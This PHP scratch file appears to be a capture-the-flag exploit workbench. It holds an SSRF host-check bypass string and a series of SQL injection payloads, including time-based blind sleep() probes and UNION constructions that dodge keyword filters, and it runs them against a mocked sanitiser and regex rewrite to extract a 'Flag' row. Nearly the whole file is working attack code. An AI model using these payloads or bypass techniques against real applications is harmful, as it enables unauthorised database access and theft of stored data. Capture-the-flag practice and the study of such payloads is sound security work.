<?php
    // $arg = "/tmp/asdf";
    // if(preg_match("/:\/\//", $arg)) {
    //     die("no hack");
    // }

    // $url = "http://localhost:80\@.cce.cstec.kr"; 
    // $path = "/";
    $arg = "http://localhost:80\@.cce.cstec.kr|/?action=db_version";
    list($url, $path) = @explode("|", $arg);
    echo $url. " " . $path ;
    // $host = substr($url, 7);
    // if ($host != "cce.cstec.kr" && !preg_match("/\.cce\.cstec\.kr$/", $host)) 
    //     die("no hack1");

    if (preg_match("/[^A-Za-z0-9-._%?=&\/]/", $path))
        die("no hack2");

    // $real_url = "http://{$host}/{$path}";
    
    // echo $host;

    // $parse_url = parse_url($real_url); 
    // echo $parse_url["host"]; 
    $event_name = " union select 1\nfrom (select case when ord(substr(body from 1 for 1))=99 then sleep(2) end XXX from events GROUP BY name HAVING name=\"Flag\") k; --";
    $event_name = " union select 1\nfrom (select body XXX from events GROUP BY name HAVING name=\"Flag\") k; --";
    $event_name = " union select 1\nfrom (select 1 XXX) X UNION select body XXX from events GROUP BY name HAVING name=\"Flag\";--";
    $event_name = " union select 1\nfrom (select (select sum(body like 'c%') from events group by name having name=\"Flag\")=1 and sleep(3) XXX) XXX;--";
    $event_name = " union select 1 dd\n.* from (select * from events join (select (select 0x4141)eeee) mm union/**/select * from (select 1)a join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)b join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)c join (select body from events offset 1 rows fetch next 1 rows only)d join (select 5)e offset 3 rows fetch next 1 rows only  )XXX;";
    if(preg_match("/(as|,|where|limit)/i", $event_name))
        die("no hack");

    $event_name = addslashes($event_name);
    $sql = "select * from events where name = '{$event_name}'";
    $sql = trim($sql);
    // echo $sql;
    $sql = preg_replace("#^select.*from.*[\s\(]+union[\s\)]+.*#i ", "select XXX", $sql);
    $sql = preg_replace("#^select.*from.*where.*`?information_schema`?.*#i", "select XXX", $sql);
    echo $sql ;
?>